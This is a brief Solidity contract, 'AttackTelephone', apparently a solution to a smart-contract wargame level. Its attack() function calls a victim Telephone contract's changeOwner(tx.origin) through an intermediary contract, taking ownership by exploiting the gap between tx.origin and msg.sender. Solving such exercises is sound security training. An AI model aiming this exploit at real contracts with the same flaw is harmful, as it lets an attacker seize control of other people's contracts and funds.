// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Telephone.sol";

contract AttackTelephone {
    Telephone public victimContract;

    constructor(address _victim) {
        victimContract = Telephone(_victim);
    }

    function attack() public {
        
        victimContract.changeOwner(tx.origin);
    }
}